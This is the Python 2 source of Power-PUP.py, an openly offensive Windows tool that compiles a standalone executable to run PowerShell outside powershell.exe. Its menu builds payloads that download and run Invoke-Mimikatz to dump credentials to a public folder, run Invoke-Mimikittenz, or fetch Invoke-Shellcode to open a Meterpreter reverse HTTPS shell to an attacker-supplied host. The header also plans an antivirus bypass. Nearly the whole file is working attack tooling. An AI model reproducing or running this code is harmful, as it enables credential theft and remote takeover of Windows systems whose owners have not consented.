#---------------------------------------------------------------#
#!/bin/python2                                                  #
#-Metadata------------------------------------------------------#
#  Filename: Power-PUP.py                                       #
#  Release: 2016-07-26                                          #
#                                                               #
#-Info----------------------------------------------------------#
#  Powershell Universal Programmer (Power-PUP.py) is a Windows  #
#    Python script to compile Windows                           #
#    System.Management.Automation for a powershell alternative. #
#                                                               #
#-Author(s)-----------------------------------------------------#
#  Joseph Barcia                    - github.com/jbarcia        #
#  Scott Bernstein (Feel the Bern?) - github.com/scott-be       #
#                                                               #
#-Operating System----------------------------------------------#
#  Designed for: Windows 7+ running .Net Framework 4.5+         #
#     Tested on: Windows 7 running .Net Framework 4.5           #
#                                                               #
#-Licence-------------------------------------------------------#
#  MIT License ~ http://opensource.org/licenses/MIT             #
#                                                               #
#-Notes---------------------------------------------------------#
#  USAGE                                                        #
#  Powershell Universal Programmer (Power-PUP.py)               #
#                                                               #
#  Usage: Power-PUP.py -a target_architecture                   #
#  -a | --arch                - architecture of the target host #
#  -o | --output              - executable output name          #
#                                                               #
# Examples:                                                     #
# Power-PUP.py -a x86                                           #
# Power-PUP.py -a x64 -o psx64.exe                              #
#                                                               #
#-Future Additions----------------------------------------------#
#  - Detect .Net Version                                        #
#       HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\                  #
#       NET Framework Setup\NDP\v4\Full\InstallPath             #
#  - A/V XOR bypass                                             #
#                                                               #
#---------------------------------------------------------------#

import sys
import os
import string
import getopt
from sys import argv

name = "Powershell Universal Programmer"
shrtname = " (Power-PUP.py)"
__version__ = "1.5"


banner = '''

                                  ,.+----.
                              ,*""         I
             ____           /         Mbp. dP          __
         ,o@QBBBBBbm,_     ; ,d       /~`QMP'\     _odBBBBbo,
         OBBROYALBBBBBBBBmOBBBM      |    |   |,*~dBBBBBBBBBBBb 
         OBBBBBBBBBBqBBBBBBBBBP      |  0 |0 ,'  dBBBBBBBBBBBBBb
         "*BBBP"     ^OBBBP"          \__/  ~    OBBBBBBBBBBBBBP
     /                     :           __.       `0BBBBBBBBBBP|
                   .-.     `          ~,A.         `0BBBBBBBBP |
                .-(   `x__  `\        .B*Bb          `"?OOP~   ;
             .-(   `\/'   `.  `~--++*\{  `Pb           ,'     ,'
  /         (   `\_/'\__/  )     _    !`-' !`.       ,'     ,'  
       /     `\_/'       ,'     L "+,_|    |-,`.__ ,'    _,','~~\.~~~\\
                \        /\    / ',   "+.  |/ >   `~~~~~~  ,'    :/~  \\
   /             `~===\/'  `\/'    "+.   >{  /\        __.,: |   ;    ;
          /           {         ,|    `\/  \/  `Y~~---~   `. `--:'~~~';
                       `\     ,&#|      ppppppp  \         `,   ;^`~~';
       /               ,d#b,.&###|      PPP  PP   `\     __.;~~' `~~~'
     /              ,d###########|      PPP  PP     Y~~~~
                ,d############i~        PPPPPPP     I  
          ,d##################I         PPP         I     /   /
(#############################b.        PPP         Im 
   )############################b.                 d#b
  (###############################b++g+++~#b      ,d##P
      }####################P~ ~Y####P    J#P`~~~T'
     (###################P'     `YP'    ;P'   ,'
       )###############P'        '    ,'    ,'    /
      (##############P'          __+~'   /##'
 /            Y####P'         ;-'     /###P
           /   Y#P'         /'      /&##P~
                |         /'      /&#P~         
     /          `\______/'\_____/'              
                                   /            
                          /
             /                          

'''

def mimi_quick():
    # invoke-mimicatz quick execute

    location = raw_input("\nEnter Invoke-Mimikatz location (Ex. http://192.168.1.1/im.txt) : \n: ")
    ps_script = "IEX (New-Object Net.WebClient).DownloadString('" + location + "'); Invoke-Mimikatz -DumpCreds > c:\\Users\\Public\\katz.txt"

    print '\nFile will be saved to: c:\\Users\\Public\\katz.txt\n'
    write_csfile(ps_script)
    
def kitti_quick():
    # invoke-mimicatz quick execute

    location = raw_input("\nEnter Invoke-Mimikittenz location (Ex. http://192.168.1.1/im.txt) : \n: ")
    ps_script = "IEX (New-Object Net.WebClient).DownloadString('" + location + "'); Invoke-mimikittenz > c:\\Users\\Public\\kitz.txt"

    print '\nFile will be saved to: c:\\Users\\Public\\kitz.txt\n'
    write_csfile(ps_script)
    
def shell_quick():
    # invoke-shellcode quick execute

    location = raw_input("\nEnter Invoke-Shellcode location (Ex. http://192.168.1.1/is.txt) : \n: ")
    revhost = raw_input("\nEnter reverse host (Ex. 192.168.1.2) : \n: ")
    ps_script = "IEX (New-Object Net.WebClient).DownloadString('" + location + "'); Invoke-Shellcode -Payload windows/meterpreter/reverse_https -Lhost " + revhost + " -Lport 443 -force"
    print '''
    \nSHELLCODE
   PAYLOAD: windows/meterpreter/reverse_https
   LHOST: ''' + revhost
    print "   LPORT: 443\n\n"

    write_csfile(ps_script)

def enter_ps():
    ps_input = raw_input("Enter the powershell commands to execute seperated by <ENTER>. \n: ")
    command = '(' + ps_input + ')'

    while (ps_input.strip()):
        ps_input = raw_input(': ')
        if ps_input != '':
            command += ' -or (' + ps_input + ')'

#    print command

    #(calc.exe) -or ((sleep -s 10) -or (notepad.exe))
    #ps_script = string.replace(command, '\\', '\\\\')
    ps_script = command
    print
    
    write_csfile(ps_script)
    

def write_csfile(ps_script):
    # Open and create cs file to compile

    ps_script = string.replace(ps_script, '\\', '\\\\')

    with open('temp.cs', 'w') as f:
        f.write('using System;\nusing System.Collections.ObjectModel;\nusing System.Management.Automation;\nusing System.Management.Automation.Runspaces;\n\nnamespace nps\n{\n    class Program\n    {\n        static void Main(string[] args)\n        {\n            PowerShell ps = PowerShell.Create();\n')
        f.write('            String script = "' + ps_script + '";\n')
        f.write('            ps.AddScript(script);\n            Collection<PSObject> output = null;\n            try\n            {\n                output = ps.Invoke();\n            }\n            catch(Exception e)\n            {\n                Console.WriteLine("Error while executing the script.\\r\\n" + e.Message.ToString());\n            }\n            if (output != null)\n            {\n                foreach (PSObject rtnItem in output)\n                {\n                    Console.WriteLine(rtnItem.ToString());\n                }\n            }\n        }                \n    }\n}\n')
        f.close
    
    
def compile_exe(arch,out_exe):
    # Compile the executable

    if arch == 'x86':
        dotnet_loc = "C:\\Windows\Microsoft.NET\\Framework\\v4.0.30319\\"
    else:
        dotnet_loc = "C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\"

    os.system('cmd.exe /c ' + dotnet_loc + 'csc.exe /unsafe /reference:"C:\\windows\\assembly\\GAC_MSIL\\System.Management.Automation\\1.0.0.0__31bf3856ad364e35\\System.Management.Automation.dll" /reference:System.IO.Compression.dll /out:' + out_exe + ' /platform:' + arch +' "temp.cs"')


def usage():
    print "Usage: Power-PUP.py -a target_architecture"
    print "-a | --arch                - architecture of the target host"
    print "-o | --output              - executable output name"
    print
    print
    print "Examples: "
    print "Power-PUP.py -a x86"
    print "Power-PUP.py -a x64 -o psx64.exe"
    sys.exit(0)


def main():

    print "\n" + name + " v" + __version__
    print shrtname + "\n"
    print
    print banner
    # check if running windows
    if os.name != 'nt':
        print "Powershell Universal Programmer (Power-PUP.py) is a Windows Python script to compile Windows System.Management.Automation for a powershell alternative."
        sys.exit(0)

    # check argument length
    if not len(sys.argv[1:]):
            usage()
            
    # read the commandline options
    try:
        # variable: <- variable with argument, no : no argument ex. a
        opts, args = getopt.getopt(sys.argv[1:],"ha:o:",["help","arch","output"])
    except getopt.GetoptError as err:
        print str(err)
        usage()
    
    out_exe = "ps.exe"        
            
    for o,a in opts:
            if o in ("-h","--help"):
                usage()
            elif o in ("-a", "--arch"):
                arch = a
                while arch not in ["x86", "x64"]:
                    print "\nOnly x86 or x64 architectures are allowed.\n"
                    sys.exit(0)
            elif o in ("-o", "--output"):
                out_exe = a
            else:
                assert False,"Unhandled Option"

    menu = {}
    menu['1']=" Invoke-Mimikatz" 
    menu['2']=" Invoke-Shellcode"
    menu['3']=" Invoke-Mimikittenz" 
    menu['4']=" Custom PowerShell Command"
    menu['5']=" Exit"
    options=menu.keys()
    options.sort()
    for entry in options: 
        print entry, menu[entry]

    selection=raw_input("\nPlease Select:  ")
    if selection =='1':
        mimi_quick() 
    elif selection == '2': 
        shell_quick()
    elif selection == '3': 
        kitti_quick()
    elif selection == '4':
        enter_ps() 
    elif selection == '5': 
        sys.exit(0)
    else: 
        print "Unknown Option Selected!" 

    compile_exe(arch,out_exe)
    
    
main()